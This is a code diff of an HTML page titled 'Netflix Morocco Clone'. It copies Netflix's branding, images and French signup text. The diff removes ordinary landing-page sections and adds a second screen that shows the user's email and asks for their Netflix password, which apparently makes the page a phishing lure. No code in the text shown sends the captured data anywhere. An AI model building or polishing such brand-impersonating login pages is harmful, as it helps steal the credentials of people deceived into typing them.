@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix Morocco</title>
+    <title>Netflix Morocco Clone</title>
     <style>
-        /* التنسيق المطابق للصورة تماماً */
         :root {
             --netflix-red: #e50914;
             --dark-bg: #000000;
@@ -16,115 +15,116 @@
             background-color: var(--dark-bg);
             color: white;
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            direction: ltr;
+            margin: 0; padding: 0; overflow-x: hidden;
         }
 
-        /* الجزء العلوي - Hero */
+        /* الصفحة الأولى - Landing Page */
+        #page1 { display: block; }
+
         .hero {
-            background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.1) 60%, rgba(0,0,0,0.9) 100%), 
+            background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.2) 60%, rgba(0,0,0,0.9) 100%), 
                         url('https://assets.nflxext.com/ffe/siteui/vlv3/acc0b39e-f304-472e-8395-537e24867c4d/web/MA-en-20211025-popsignuptwoweeks-perspective_alpha_website_large.jpg');
-            background-size: cover;
-            padding: 20px 5%;
-            text-align: center;
-            min-height: 80vh;
+            background-size: cover; padding: 20px 5%; min-height: 90vh; text-align: center;
         }
 
         nav { display: flex; justify-content: space-between; align-items: center; }
-        .logo { width: 100px; }
-        .btn-red { background: var(--netflix-red); border: none; color: white; padding: 7px 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .logo { width: 120px; }
+        .btn-red-sm { background: var(--netflix-red); color: white; border: none; padding: 7px 15px; border-radius: 4px; font-weight: bold; cursor: pointer; }
 
-        .hero-content { margin-top: 80px; }
-        h1 { font-size: 2.5rem; font-weight: 900; margin-bottom: 10px; }
-        .hero-p { font-size: 1.2rem; margin-bottom: 20px; }
+        .hero-content { margin-top: 100px; max-width: 800px; margin-inline: auto; }
+        h1 { font-size: 3rem; font-weight: 900; line-height: 1.1; margin-bottom: 20px; }
+        .hero-p { font-size: 1.4rem; margin-bottom: 25px; }
 
-        /* حقل الإدخال وزر "Commencer" */
-        .cta-group { display: flex; flex-direction: column; align-items: center; gap: 15px; margin-top: 30px; }
-        .cta-group input { 
-            width: 90%; max-width: 400px; padding: 15px; 
-            background: rgba(0,0,0,0.7); border: 1px solid #555; 
-            color: white; border-radius: 4px; font-size: 1rem;
-        }
-        .btn-large { 
-            background: var(--netflix-red); color: white; border: none; 
-            width: 90%; max-width: 250px; padding: 12px; 
-            font-size: 1.2rem; font-weight: bold; border-radius: 4px; cursor: pointer; 
-        }
+        .cta-group { display: flex; justify-content: center; gap: 8px; margin-top: 30px; flex-wrap: wrap; }
+        .cta-group input { width: 400px; padding: 20px; background: rgba(0,0,0,0.6); border: 1px solid #555; color: white; border-radius: 4px; font-size: 1rem; }
+        .btn-large { background: var(--netflix-red); color: white; border: none; padding: 15px 35px; font-size: 1.5rem; font-weight: bold; border-radius: 4px; cursor: pointer; }
 
-        /* قسم الأفلام المتصدرة - Trending */
-        .section { padding: 40px 5%; border-top: 8px solid #232323; }
-        .trending-row { display: flex; gap: 40px; overflow-x: auto; padding: 20px 0; }
-        .trend-card { position: relative; min-width: 140px; }
-        .trend-card img { width: 100%; border-radius: 8px; }
-        .rank { 
-            position: absolute; bottom: -15px; left: -25px; 
-            font-size: 6rem; font-weight: 900; color: black; 
-            -webkit-text-stroke: 2px #fff; z-index: 1;
-        }
+        /* الصفحة الثانية - Password Page (مطابقة للصورة الثانية) */
+        #page2 { display: none; background-color: white; color: #333; min-height: 100vh; }
+        #page2 nav { border-bottom: 1px solid #e6e6e6; padding: 15px 5%; background: white; }
+        #page2 .logo { width: 100px; filter: none; }
+        #page2 .btn-nav { font-weight: bold; font-size: 1.1rem; cursor: pointer; background: none; border: none; color: #333; }
 
-        /* مربعات المميزات البنفسجية */
-        .features-grid { display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px; }
-        .feature-box { 
-            background: var(--card-gradient); 
-            padding: 25px; border-radius: 15px; 
-            border: 1px solid #222; position: relative;
-        }
-        .feature-box h3 { margin-bottom: 10px; font-size: 1.3rem; }
-        .feature-box p { color: #b3b3b3; font-size: 0.9rem; }
+        .login-container { max-width: 440px; margin: 60px auto; padding: 20px; }
+        .step { font-size: 0.85rem; text-transform: uppercase; color: #333; margin-bottom: 10px; }
+        .login-container h2 { font-size: 2rem; color: #333; font-weight: bold; margin-bottom: 20px; }
+        .login-container p { font-size: 1.1rem; color: #333; margin-bottom: 15px; }
+        
+        .user-email { font-weight: bold; margin-bottom: 20px; display: block; }
+        
+        .input-box { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 1rem; margin-bottom: 10px; }
+        .link-blue { color: #0071eb; text-decoration: none; font-size: 0.95rem; display: block; margin-bottom: 25px; }
+        .btn-next { background: var(--netflix-red); color: white; width: 100%; padding: 18px; border: none; font-size: 1.5rem; border-radius: 4px; cursor: pointer; }
 
-        /* الأسئلة الشائعة FAQ */
-        .faq-item { 
-            background: #2d2d2d; padding: 20px; margin-bottom: 8px; 
-            display: flex; justify-content: space-between; font-size: 1.1rem;
-        }
-
+        /* Footer (Page 2) */
+        .footer-light { background: #f3f3f3; padding: 30px 10%; border-top: 1px solid #e6e6e6; color: #737373; font-size: 0.9rem; }
+        .footer-light a { color: #737373; text-decoration: none; margin-right: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="hero">
+    <div id="page1">
+        <div class="hero">
+            <nav>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
+                <button class="btn-red-sm">S'identifier</button>
+            </nav>
+            <div class="hero-content">
+                <h1>Films et séries en illimité, et bien plus</h1>
+                <p class="hero-p">À partir de 35 MAD. Annulable à tout moment.</p>
+                <p>Prêt à regarder Netflix ? Saisissez votre adresse e-mail.</p>
+                <div class="cta-group">
+                    <input type="email" id="main-email" placeholder="Adresse e-mail">
+                    <button class="btn-large" onclick="goToStep2()">Commencer ></button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page2">
         <nav>
             <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
-            <button class="btn-red">S'identifier</button>
+            <button class="btn-nav">S'identifier</button>
         </nav>
-        <div class="hero-content">
-            <h1>Films et séries en illimité, et bien plus</h1>
-            <p class="hero-p">À partir de 35 MAD. Annulable à tout moment.</p>
-            <div class="cta-group">
-                <input type="email" placeholder="Adresse e-mail">
-                <button class="btn-large">Commencer ></button>
+        
+        <div class="login-container">
+            <div class="step">Étape <b>1</b> sur <b>3</b></div>
+            <h2>Ravis de vous revoir !<br>Il est très facile de rejoindre Netflix.</h2>
+            <p>Saisissez votre mot de passe pour commencer à regarder vos films et séries préférés.</p>
+            
+            <span class="step" style="color:#737373">E-mail</span>
+            <span class="user-email" id="display-email"></span>
+            
+            <input type="password" class="input-box" placeholder="Mot de passe">
+            <a href="#" class="link-blue">Mot de passe oublié ?</a>
+            
+            <button class="btn-next">Suivant</button>
+        </div>
+
+        <div class="footer-light">
+            <p>Des questions ? <a href="#">Contactez-nous.</a></p><br>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                <a href="#">FAQ</a> <a href="#">Centre d'aide</a>
+                <a href="#">Conditions d'utilisation</a> <a href="#">Confidentialité</a>
             </div>
         </div>
     </div>
 
-    <div class="section">
-        <h2>Tendances actuelles</h2>
-        <div class="trending-row">
-            <div class="trend-card"><span class="rank">1</span><img src="https://via.placeholder.com/150x220/333/fff?text=Show+1"></div>
-            <div class="trend-card"><span class="rank">2</span><img src="https://via.placeholder.com/150x220/333/fff?text=Show+2"></div>
-        </div>
-    </div>
-
-    <div class="section">
-        <h2>Encore plus de raisons de vous abonner</h2>
-        <div class="features-grid">
-            <div class="feature-box">
-                <h3>Regardez Netflix sur votre TV</h3>
-                <p>Smart TV, PlayStation, Xbox, Chromecast, Apple TV, etc.</p>
-            </div>
-            <div class="feature-box">
-                <h3>Téléchargez vos séries</h3>
-                <p>Enregistrez vos programmes préférés pour les regarder hors connexion.</p>
-            </div>
-        </div>
-    </div>
-
-    <div class="section">
-        <h2>Foire aux questions</h2>
-        <div class="faq-item">Netflix, qu'est-ce que c'est ? <span>+</span></div>
-        <div class="faq-item">Combien coûte Netflix ? <span>+</span></div>
-    </div>
+    <script>
+        function goToStep2() {
+            const emailValue = document.getElementById('main-email').value;
+            if(emailValue === "") {
+                alert("Veuillez saisir votre e-mail");
+                return;
+            }
+            // نقل البريد الإلكتروني للصفحة الثانية
+            document.getElementById('display-email').innerText = emailValue;
+            // إخفاء الصفحة الأولى وإظهار الثانية
+            document.getElementById('page1').style.display = 'none';
+            document.getElementById('page2').style.display = 'block';
+            window.scrollTo(0,0);
+        }
+    </script>
 
 </body>
 </html>
